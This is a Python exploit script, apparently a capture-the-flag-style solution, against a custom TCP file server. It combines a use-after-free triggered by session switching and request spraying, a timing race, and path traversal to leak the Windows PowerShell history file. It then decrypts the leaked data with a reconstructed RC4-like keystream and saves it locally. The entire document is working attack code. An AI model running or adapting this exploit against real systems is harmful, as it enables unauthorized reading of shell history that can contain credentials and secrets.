#!/usr/bin/env python3

import socket, threading, time, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = 9876
TARGET = sys.argv[2] if len(sys.argv) > 2 else "..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"

TARGET = "..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
SPRAY_FILE = "some.txt"
KEY_SIZE = 32
LEGIT_FILE = "test.txt"
LEGIT_SIZE = 0
pobeda = threading.Event()
result = [None]

def recv(sock, t=0.5):
    sock.settimeout(t)
    data = b""
    try:
        while True:
            conn = sock.recv(4096)
            if not conn: break
            data += conn
    except: pass
    return data

def connect():
    sock = socket.socket()
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.connect((HOST, PORT))
    recv(sock, 0.2)
    sock.send(b"1\n")
    recv(sock, 0.2)
    return sock

def uaf(legit_sock, attack_sock):
    legit_sock.send(b"SWITCH\n"); time.sleep(0.03); recv(legit_sock, 0.1)
    legit_sock.send(b"1\n"); time.sleep(0.03); recv(legit_sock, 0.1)
    for _ in range(40):
        attack_sock.send(f"INFO {SPRAY_FILE}\n".encode())
        time.sleep(0.005)
    recv(attack_sock, 0.1)

def race(a_sock, b_sock, delay):
    if pobeda.is_set(): return
    barrier = threading.Barrier(2, timeout=2)
    res = [None]
    def get_legit():
        try:
            barrier.wait()
            a_sock.send(b"GET test.txt\n")
            res[0] = recv(a_sock, 1.5)
        except: pass
    def get_attacking():
        try:
            barrier.wait()
            time.sleep(delay)
            b_sock.send(f"GET {TARGET}\n".encode())
        except: pass
    t1 = threading.Thread(target=get_legit); t2 = threading.Thread(target=get_attacking)
    t1.start(); t2.start(); t1.join(2); t2.join(2)
    
    if res[0] and b"FILE_SIZE:" in res[0]:
        try:
            sz = int(res[0].split(b"FILE_SIZE:")[1].split(b"\r\n")[0])
            if sz != LEGIT_SIZE and sz > 0:
                pobeda.set()
                result[0] = res[0]
                print(f"\n:: GOT {sz} bytes!")
        except: pass

def expand_keystream(key, key_len, iv, stream_len):
    """Stream cipher keystream generation (RC4-like)"""
    state = list(range(256))
    
    j = 0
    for i in range(256):
        j = (j + state[i] + key[i % key_len] + iv[i % 16]) % 256
        state[i], state[j] = state[j], state[i]
    
    keystream = bytearray(stream_len)
    i = k = 0
    for pos in range(stream_len):
        i = (i + 1) % 256
        k = (k + state[i]) % 256
        state[i], state[k] = state[k], state[i]
        keystream[pos] = state[(state[i] + state[k]) % 256]
    
    return keystream

def decrypt(data):
    iv_pos = data.find(b"IV:") + 3
    iv_end = data.find(b"\r\n", iv_pos)
    iv = bytearray(data[iv_pos:iv_end])  # Raw bytes
    enc_start = data.find(b"DATA:\r\n") + 7
    enc_end = data.find(b"\r\nFILE_END")
    encoded_res = data[enc_start:enc_end]
    
    key = bytearray(KEY_SIZE)
    fname_bytes = SPRAY_FILE.encode()
    key[:len(fname_bytes)] = fname_bytes
    
    keystream = expand_keystream(key, KEY_SIZE, iv, len(encoded_res))
    out = bytearray(len(encoded_res))
    for i in range(len(encoded_res)):
        out[i] = encoded_res[i] ^ keystream[i]
    return bytes(out)

def detect_legit_size():
    global LEGIT_SIZE
    try:
        sock = connect()
        sock.send(f"GET {LEGIT_FILE}\n".encode())
        data = recv(sock, 1.0)
        sock.close()
        if b"FILE_SIZE:" in data:
            LEGIT_SIZE = int(data.split(b"FILE_SIZE:")[1].split(b"\r\n")[0])
            return True
    except: pass
    return False

def main():
    print(f":: {HOST}:{PORT} -> {TARGET}")
    
    if not detect_legit_size():
        print(f"[-] Could not detect size of {LEGIT_FILE}")
        return 1
    print(f":: {LEGIT_FILE} = {LEGIT_SIZE} bytes")
    
    delays = [0, 0.0001, 0.0002]
    
    for round in range(100):
        if pobeda.is_set(): break
        try:
            legit_sock, attack_sock = connect(), connect()
            uaf(legit_sock, attack_sock)
            for d in delays:
                if pobeda.is_set(): break
                print(f":: r={round+1} d={d*1000:.2f}ms", end='\r')
                race(legit_sock, attack_sock, d)
            legit_sock.close(); attack_sock.close()
        except: pass
    
    if not result[0]:
        print("\n[-] Failed"); return 1
    
    dec = decrypt(result[0])
    print(f":: Decrypted {len(dec)} bytes")
    
    out = TARGET.replace("\\","_").replace("..","").replace("/","_").strip("_") or "out.txt"
    open(out, "wb").write(dec)
    print(f":: Saved: {out}")
    print(dec.decode(errors='replace')[:2000])
    return 0

if __name__ == "__main__":
    main()
